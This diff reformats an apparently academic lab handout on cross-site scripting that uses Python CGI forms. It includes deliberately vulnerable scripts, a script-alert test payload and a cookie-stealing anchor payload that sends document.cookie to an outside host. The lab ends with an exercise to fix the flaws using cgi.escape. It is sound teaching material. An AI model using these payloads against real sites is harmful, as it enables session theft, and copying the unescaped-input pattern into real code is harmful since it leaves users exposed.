@@ -163,7 +163,7 @@ Cross-scripting attacks are another common way to get into Web applications.
 
 ## Create another form ##
 
-Create a Web page called `formXSS.py` with the following contents:
+Create a Web page called `xssForm.cgi` with the following contents:
 
 ```python
 #!/usr/bin/python
@@ -240,11 +240,11 @@ Input the following value in the *user* field and hit submit again:
 
 	<script>alert('attacked');</script>
 
-** Stealing cookies
+# Part 4: Cookie Stealing #
 
-Create a script that sets a cookie. Call this script =cookies.py=
+Create a script that sets a cookie. Call this script `xssCookies.py`
 
-#+begin_src python
+```python
 #!/usr/bin/env python
 
 import cgi, cgitb 
@@ -271,64 +271,67 @@ else:
    print "<h3>Hello [" + user + "]"
    print "</h3>"
 
-
 print '<br><hr>'
 print 'Server time is', time.asctime(time.localtime())
 print '</body></html>'
-#+end_src
+```
 
-Load the script. Now inspect the cookies in your browser to make sure the cookie was set. (In Firefox you can find the cookies in
-/Preferences/Privacy/History/Remove Individual Cookies/ Make sure the cookie was set.
+Load the script. Now inspect the cookies in your browser to make sure the cookie was set. (In Firefox you can find the cookies in Options > Privacy > Show Cookies.) Make sure the cookie is set.
 
-Let us create another web page to test it. This time we will call it =cookies.html=
+Let us create another web page to test it. This time we will call it `xssForm2.cgi`
 
-#+begin_src html
+```python
+#!/usr/bin/python
+
+print("Content-Type: text/html\n\n")
+print("""
+<html>
+  <Title>Hello in HTML</Title>
+<body>
 <h1>Cross scripting attack</h1>
 
 This form will help us test cross-scripting attacks.
 
-<form action="cookies.py" method="get">
+<form action="xssCookies.py" method="get">
 User: <input type="text" name="user"><br>
 <input type="hidden" name="notshown" value="abc"><br>
 <input type="submit" value="Submit">
 </form>
-#+end_src
+</body>
+</html>
+""")
+```
 
-Test it. It should behave as expected
+Test it. It should behave as expected.
 
-** Stealing the cookie
+## Stealing the cookie ##
 
 Now pass the following string in the user field:
 
-#+begin_example
-<a href="cookies.py" onClick="javascript:document.location.replace('http://turingmachine.org/text' + escape(document.cookie)); return false;">my name</a>
-#+end_example
+	<a href="xssCookies.py" onClick="javascript:document.location.replace('http://turingmachine.org/text' + escape(document.cookie)); return false;">my name</a>
 
-As you can see, the location where the /Name/ should be displayed is now replaced with a link. Follow it. Look at the resulting URL. This URL does not exist,
-but inspect the URL that you were trying to retrieve.
+As you can see, the location where the *Name* should be displayed is now replaced with a link. Follow it. Look at the resulting URL. This URL does not exist, but inspect the URL that you were trying to retrieve.
 
-*Q6: What URL is displayed when the mouse is hovered over the link?*
+**Question 6:** What URL is displayed when the mouse is hovered over the link?
 
-*Q7: What is the full URL that is actually the link is followed? Why is this an attack?*
+**Question 7:** What is the full URL that is actually the link is followed? Why is this an attack?
 
-This attack is very pernicious. It is capable of stealing all the cookies of a site by simply logging the access to the destination Website.
+This attack is very pernicious. It is capable of stealing all the cookies of a site by simply logging the access to the destination website.
 
-* Part3 Cross-scripting attacks using Chromium
+# Part 5: Cross-scripting attacks using Chrome #
 
-Try the same attacks on Chromium.
+Try the same attacks on Chrome.
 
-*Q8: Which of the attacks did not succeed when using Chromium? Why?*
+**Question 8:** Which of the attacks did not succeed when using Chromium? Why?
 
-* Part 4 Fix the vulnerability of Part 2 and Part 3
+# Part 6: Fix the XSS vulnerabilities
 
-Fix the vulnerabilities in your scripts. Hint: see /cgi.escape/ in https://docs.python.org/2/library/cgi.html
+Fix the vulnerabilities in your scripts `xssSimple.py` and `xssCookies.py`. Hint: see *cgi.escape* in [https://docs.python.org/2/library/cgi.html](https://docs.python.org/2/library/cgi.html)
 
-* What to submit
+# Submission #
 
-Submit a zip file that contains:
+You will be submitting three files separately (do **not** zip them):
 
-- Your scripts
-- Your HTML
-- Your Answers
-
-
+- `report.txt` Your answers to the 8 questions
+- `xssSimple.py` Your fixed form script
+- `xssCookies.py` Your fixed cookies script
